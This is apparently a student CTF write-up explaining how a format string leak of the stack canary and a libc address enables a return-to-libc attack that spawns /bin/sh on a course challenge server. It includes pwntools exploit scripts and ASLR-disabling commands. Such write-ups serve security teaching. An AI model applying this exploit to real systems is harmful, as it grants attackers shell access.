We started by checking the ``program`` protections, and found out it would be difficult to access the program. However, we also found that the program wasn't checking the length of the input, thus ``fgets`` function is reading 100 characters, while it should be only reading 20.

![alt text](img/Screenshot%202022-12-16%20at%2017.26.03.JPG)

Trying to do a format string vulnerability, and printed stack's information:

![alt text](img/Screenshot%202022-12-16%20at%2017.29.15.JPG)

After this we started exploring the other file given, and found an attack called `Return-to-libc`. To explore this vulnerability, we first disabled ASLR (Address Space Layout Randomization) with `echo 0 > /proc/sys/kernel/randomize_va_space`. We then searched for the location of `bin/sh` and `system offset` with the commands `strings -t x libc.so.6 | grep "/bin/sh"` and `readelf -s libc.so.6 | grep system`, respectively. 

![alt text](img/Screenshot%202022-12-16%20at%2017.38.22.JPG)

We also found the offset of libc and the range where libc is mapped, by using `info proc map`, a function of gdb. Having this information, we wrote the following program to retrieve the values from the stack:

```python
#!/usr/bin/python3
from pwn import *

LOCAL = False

if LOCAL:
	pause()
else:
	p = remote("ctf-fsi.fe.up.pt", 4002)

for i in range(1,14):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"Insert your name (max 20 chars): ")
	p.sendline("%" + str(i) + "$10p")
	answer = p.recvline()
	print("i: ", i, "-> stack", answer)
	p.recvuntil(b"Insert your message: ")
	p.sendline(b"")


p.interactive()
```

The libc values were located between `0xf7daa519` and `0xf7d89000`. The stack's value in index 8 always ended with 00, so we figured out this should have been the canary.

We rewrote the previous script to make it repeat 3 times, so we could get the canary's value (to not break it), to overwrite the return address to libc, to write "E" 19 times and insert '\0' in its end in order to not break the canary.

```py
#!/usr/bin/python3
from pwn import *

LOCAL = False

referenceLibOffset = 0xf7daa519 - 0xf7d89000
systemLibOffset = 0x48150
shLibOffset = 0x1bd0f5

def sendMessage(p, message):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"Insert your name (max 20 chars): ")
	p.sendline(message)
	answer = p.recvline()
	p.recvuntil(b"Insert your message: ")
	p.sendline(b"")
	return answer

if LOCAL:
	pause()
else:
	p = remote("ctf-fsi.fe.up.pt", 4002)

message1 = sendMessage(p, b"%8$x-%11$x")

canary, referenceVal = [int (val, 16) for val in message1.split(b'-')]

libBase = referenceVal - referenceLibOffset
addressSystem = libBase + systemLibOffset
adressSH = libBase + shLibOffset

message2 = flat(b"A"*20, canary +1, b"A"*8, addressSystem, b"A"*4, adressSH)

sendMessage (p, message2)

sendMessage(p, b"E"*19)

p.interactive()
```

Ran the script and got the flag.

![alt text](img/Screenshot%202022-12-17%20at%2015.06.45.JPG)